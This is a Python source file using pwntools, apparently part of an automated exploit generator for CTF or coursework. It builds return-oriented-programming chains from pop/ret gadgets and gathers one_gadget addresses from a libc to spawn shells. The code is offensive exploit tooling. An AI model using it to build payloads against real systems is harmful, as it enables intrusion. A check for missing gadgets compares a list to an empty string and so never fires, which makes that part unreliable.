from pwn import *

class ROP:
    # this function will create a ROP chain that populates wanted registers
    def generate_rop_chain(self, app, dict_registers):
        payload = b""
        completed = []

        for reg in dict_registers.keys():
            # check if the value has not already been met
            if reg not in completed:
                # use a gadget that has only pop in it because if not then it can get risky
                use = []

                for file, gadget in app.rs.search(search=f"pop {reg}"):
                    tmp = [ i for i in str(gadget).split(";") ]
                    cool = True

                    for i in tmp:
                        if "pop" not in i and "ret" not in i and i != " ":
                            cool = False

                    if cool:
                        use.append(str(gadget))

                if use == "":
                    print("[!] Could not find gadget. Trying Angr ROP.")
                    return None

                # find smallest gadget
                gadget_used = use[0]

                for gadget in use:
                    if gadget.count(";") < gadget_used.count(";"):
                        gadget_used = gadget

                # we have found our gadget, now time to add it to our payload
                payload += p64(int(gadget_used.split(":")[0], 16))

                alice = gadget_used.split(":")
                instructions = alice[1].split(";")

                for ins in instructions:
                    # ins[-3:] is the register popped
                    if ins[-3:] == "ret":
                        break

                    if ins[-3:] in dict_registers.keys():
                        payload += p64(dict_registers[ins[-3:]])
                        completed.append(ins[-3:])

                    else:
                        payload += p64(0xdeadbeef)
        return payload


    # remember to have this only run once and store for all of binaries that need it
    def find_one_gadget(self, binary):
        addresses = []

        io = subprocess.run([b"one_gadget", b"./ace-student/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        io = io.split(" ")

        for alice in io:
            if "0x" in alice and "-" not in alice and "+" not in alice:
                if "\n" in alice:
                    bob = alice.split("\n")
                    addresses.append(int(bob[-1], 16))

                else:
                    addresses.append(int(alice, 16))

        return addresses

